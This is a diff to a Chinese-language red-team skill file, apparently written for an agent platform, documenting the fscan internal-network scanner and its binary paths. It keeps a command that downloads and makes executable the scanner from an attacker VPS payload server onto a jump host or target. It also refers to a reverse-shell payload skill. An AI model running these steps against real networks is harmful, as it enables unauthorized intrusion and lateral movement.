@@ -6,6 +6,10 @@ role: internal
 enabled: true
 ---
 
+> **路径约定**：下文的 `${TOOLKIT}` 指工具根目录 `$DSH_HOME/redteam/toolkit`（可在演练台「环境适配」里改）。
+> 工具一律放 `${TOOLKIT}/<工具名>/`，不要散落到 PATH 或 `~/.local/bin`。
+> 缺什么工具、装到哪、官方获取命令：跑 `redteam_preflight`，或看仓库 `docs/TOOLKIT.md`。
+
 # fscan（内网综合扫描与弱口令/漏洞）
 
 `fscan` = **广度优先的内网普查**：一段 C 段丢进去，几分钟内给出存活主机、开放端口、服务指纹、Web 标题、
@@ -24,9 +28,9 @@ enabled: true
 ## 二进制
 
 ```
-本机 : $DSH_HOME/redteam/toolkit/fscan/fscan          （v2.2.1，含本地插件）
-       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
-       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
+本机 : ${TOOLKIT}/fscan/fscan          （v2.2.1，含本地插件）
+       ${TOOLKIT}/fscan/fscan_windows_x64.exe
+       ${TOOLKIT}/fscan/fscan_linux_arm64
 VPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-reverse-shell 的载荷目录）
 ```
 
@@ -35,7 +39,7 @@ VPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-revers
 **传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：
 
 ```bash
-# 跳板机上直接下载（VPS 起载荷服务：~/.dsh/redteam/toolkit/vps/vps.sh serve 9100）
+# 跳板机上直接下载（VPS 起载荷服务：${TOOLKIT}/vps/vps.sh serve 9100）
 curl -o fscan http://<你的VPS_IP>:9100/fscan && chmod +x fscan
 # 或从本机经 shells 上传
 ```
